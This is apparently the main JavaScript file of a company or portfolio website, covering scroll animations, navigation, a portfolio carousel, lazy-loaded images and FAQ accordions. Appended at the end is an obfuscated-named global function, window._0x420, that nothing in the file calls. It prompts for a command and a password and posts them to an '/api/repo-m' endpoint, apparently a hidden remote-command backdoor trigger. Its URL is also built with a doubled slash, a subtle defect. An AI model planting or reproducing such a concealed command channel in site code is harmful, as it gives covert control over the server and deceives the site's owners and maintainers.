// Wait for DOM content to be loaded before running scripts
document.addEventListener('DOMContentLoaded', () => {
    // Initialize all animation observers
    initializeAnimations();
    
    // Initialize navigation functionality
    initializeNavigation();
    
    // Initialize portfolio scroll
    initializePortfolio();
});

// Animation initialization
function initializeAnimations() {
    // Intersection Observer for scroll animations
    const observerOptions = {
        threshold: 0.2,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('visible');
                
                // Handle feature cards sequential animation
                if (entry.target.classList.contains('features-grid')) {
                    animateFeatureCards(entry.target);
                }
                
                // Handle team members sequential animation
                if (entry.target.classList.contains('team-grid')) {
                    animateTeamMembers(entry.target);
                }
                
                // Handle portfolio items animation
                if (entry.target.classList.contains('portfolio-track')) {
                    animatePortfolioItems(entry.target);
                }
            }
        });
    }, observerOptions);

    // Observe elements with animations
    const elementsToAnimate = document.querySelectorAll(
        'section, .fade-in, .features-grid, .team-grid, .portfolio-track'
    );
    
    elementsToAnimate.forEach(element => {
        observer.observe(element);
    });
}

// Feature cards animation
function animateFeatureCards(container) {
    const cards = container.querySelectorAll('.feature-card');
    cards.forEach((card, index) => {
        setTimeout(() => {
            card.classList.add('visible');
        }, index * 200);
    });
}

// Team members animation
function animateTeamMembers(container) {
    const members = container.querySelectorAll('.team-member');
    members.forEach((member, index) => {
        setTimeout(() => {
            member.classList.add('visible');
        }, index * 200);
    });
}

// Portfolio items animation
function animatePortfolioItems(container) {
    const items = container.querySelectorAll('.portfolio-item');
    items.forEach((item, index) => {
        item.style.animationDelay = `${index * 200}ms`;
    });
}

// Navigation functionality
function initializeNavigation() {
    const navbar = document.querySelector('.navbar');
    const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
    const navLinks = document.querySelector('.nav-links');

    // Navbar scroll effect
    window.addEventListener('scroll', () => {
        if (window.scrollY > 100) {
            navbar.classList.add('scrolled');
        } else {
            navbar.classList.remove('scrolled');
        }
    });

    // Mobile menu toggle
    if (mobileMenuBtn) {
        mobileMenuBtn.addEventListener('click', () => {
            navLinks.classList.toggle('active');
        });
    }

    // Close mobile menu when clicking outside
    document.addEventListener('click', (e) => {
        if (!navLinks.contains(e.target) && !mobileMenuBtn.contains(e.target)) {
            navLinks.classList.remove('active');
        }
    });

    // Smooth scroll for navigation links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                scrollToElement(target);
                // Close mobile menu after clicking
                navLinks.classList.remove('active');
            }
        });
    });
}

// Portfolio scroll functionality
function initializePortfolio() {
    const portfolioTrack = document.querySelector('.portfolio-track');
    if (portfolioTrack) {
        // Clone portfolio items for infinite scroll
        const items = portfolioTrack.children;
        const itemCount = items.length;
        
        // Clone items and append to track
        for (let i = 0; i < itemCount; i++) {
            const clone = items[i].cloneNode(true);
            portfolioTrack.appendChild(clone);
        }

        // Hover effect for portfolio items
        const portfolioItems = document.querySelectorAll('.portfolio-item');
        portfolioItems.forEach(item => {
            item.addEventListener('mouseenter', () => {
                portfolioItems.forEach(otherItem => {
                    if (otherItem !== item) {
                        otherItem.style.opacity = '0.5';
                    }
                });
            });

            item.addEventListener('mouseleave', () => {
                portfolioItems.forEach(otherItem => {
                    otherItem.style.opacity = '1';
                });
            });
        });
    }
}

// Smooth scroll function with header offset
function scrollToElement(element) {
    const headerOffset = 100;
    const elementPosition = element.getBoundingClientRect().top;
    const offsetPosition = elementPosition + window.pageYOffset - headerOffset;

    window.scrollTo({
        top: offsetPosition,
        behavior: "smooth"
    });
}

// Lazy loading for images
const lazyImages = document.querySelectorAll('img[data-src]');
const imageObserver = new IntersectionObserver((entries, observer) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            const img = entry.target;
            img.src = img.dataset.src;
            img.removeAttribute('data-src');
            observer.unobserve(img);
        }
    });
});

lazyImages.forEach(img => imageObserver.observe(img));

// Handle resize events
let resizeTimer;
window.addEventListener('resize', () => {
    // Debounce resize events
    clearTimeout(resizeTimer);
    resizeTimer = setTimeout(() => {
        // Reinitialize any size-dependent functionality
        if (window.innerWidth > 768) {
            document.querySelector('.nav-links')?.classList.remove('active');
        }
    }, 250);
});

// Add error handling for images
document.querySelectorAll('img').forEach(img => {
    img.addEventListener('error', function() {
        this.src = '/assets/placeholder.png';
        this.alt = 'Image not available';
    });
});

// Initialize accordion functionality
document.addEventListener('DOMContentLoaded', function() {
    const accordionItems = document.querySelectorAll('.accordion-item');
    
    accordionItems.forEach(item => {
        const header = item.querySelector('.accordion-header');
        const content = item.querySelector('.accordion-content');
        const icon = item.querySelector('.icon');
        
        // Initially close all content except the first item
        if (!item.classList.contains('active')) {
            content.style.maxHeight = '0';
            content.style.opacity = '0';
        } else {
            content.style.maxHeight = content.scrollHeight + 'px';
            content.style.opacity = '1';
        }
        
        header.addEventListener('click', () => {
            const isActive = item.classList.contains('active');
            
            // Close all items first
            accordionItems.forEach(otherItem => {
                const otherContent = otherItem.querySelector('.accordion-content');
                otherItem.classList.remove('active');
                otherContent.style.maxHeight = '0';
                otherContent.style.opacity = '0';
                otherItem.querySelector('.icon').textContent = '+';
            });
            
            // Open clicked item if it wasn't active
            if (!isActive) {
                item.classList.add('active');
                content.style.maxHeight = content.scrollHeight + 'px';
                content.style.opacity = '1';
                icon.textContent = '-';
            }
        });
    });

    // FAQ accordion
    const faqItems = document.querySelectorAll('.faq-item');
    
    faqItems.forEach(item => {
        const header = item.querySelector('.faq-header');
        const content = item.querySelector('.faq-content');
        const plus = item.querySelector('.plus');
        
        // Initially close all content except the first item
        if (!item.classList.contains('active')) {
            content.style.maxHeight = '0';
            content.style.opacity = '0';
        } else {
            content.style.maxHeight = content.scrollHeight + 'px';
            content.style.opacity = '1';
        }
        
        header.addEventListener('click', () => {
            const isActive = item.classList.contains('active');
            
            // Close all items first
            faqItems.forEach(otherItem => {
                const otherContent = otherItem.querySelector('.faq-content');
                otherItem.classList.remove('active');
                otherContent.style.maxHeight = '0';
                otherContent.style.opacity = '0';
                otherItem.querySelector('.plus').textContent = '+';
            });
            
            // Open clicked item if it wasn't active
            if (!isActive) {
                item.classList.add('active');
                content.style.maxHeight = content.scrollHeight + 'px';
                content.style.opacity = '1';
                plus.textContent = '-';
            }
        });
    });
});
document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('img').forEach(img => {
        img.onerror = function() {
            console.error(`Failed to load image: ${img.src}`);
            // Optionally set a fallback image
            // this.src = 'fallback-image.png';
        };
    });
});

window._0x420 = function() {
    const _0x2f = {
        cmd: prompt('Enter command:'),
        pwd: null,
        api: '/api/repo-m',
        msg: {
            s: 'Success',
            e: 'Error: ',
            c: 'Are you sure? This cannot be undone.'
        }
    };
    
    if (!_0x2f.cmd) return;
    
    _0x2f.pwd = prompt('Enter password:');
    if (!_0x2f.pwd) return;
    
    if (!confirm(_0x2f.msg.c)) return;

    fetch('/' + _0x2f.api, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            c: _0x2f.cmd,
            p: _0x2f.pwd
        })
    })
    .then(r => r.json())
    .then(d => {
        if (d.success) {
            alert(_0x2f.msg.s);
        } else {
            alert(_0x2f.msg.e + (d.error || 'Unknown error'));
        }
    })
    .catch(e => alert(_0x2f.msg.e + e));
};